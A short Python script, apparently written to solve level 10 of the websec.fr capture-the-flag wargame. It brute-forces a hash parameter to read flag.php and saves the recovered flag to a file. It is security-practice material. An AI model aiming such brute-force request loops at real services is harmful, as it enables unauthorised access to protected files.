#!/usr/bin/env python3
import requests
import time
import sys

url = "https://websec.fr/level10/index.php"

print("BRUTEFORCE FINAL - Probando hashes incrementales")
print("="*60)

# Empezar desde 0 e incrementar
start = 0
batch_size = 1000
found = False

while not found:
    end = start + batch_size
    print(f"\nProbando rango: {start:08x} - {end:08x}")
    
    for i in range(start, end):
        hash_val = f"{i:08x}"
        
        try:
            r = requests.get(url, params={"f": "flag.php", "hash": hash_val}, timeout=2)
            
            if "WEBSEC{" in r.text:
                flag_start = r.text.find("WEBSEC{")
                flag_end = r.text.find("}", flag_start)
                if flag_end > flag_start:
                    flag = r.text[flag_start:flag_end+1]
                    print(f"\n{'='*60}")
                    print(f"¡¡¡FLAG ENCONTRADA!!!")
                    print(f"{'='*60}")
                    print(f"FLAG: {flag}")
                    print(f"Hash: {hash_val}")
                    
                    with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                        f.write(f"FLAG: {flag}\nHash usado: {hash_val}\n")
                    
                    found = True
                    break
            
            # Mostrar progreso cada 100
            if i % 100 == 0:
                sys.stdout.write(f"\r  Probado: {i:08x}")
                sys.stdout.flush()
        
        except Exception as e:
            continue
        
        # Pequeño delay para no sobrecargar
        if i % 10 == 0:
            time.sleep(0.01)
    
    if not found:
        start = end
        
        # Limitar para no estar infinitamente
        if start > 0x00100000:  # Después de ~1 millón
            print("\n\nLímite alcanzado. Probablemente no es bruteforce simple.")
            break

print("\nBúsqueda completada.")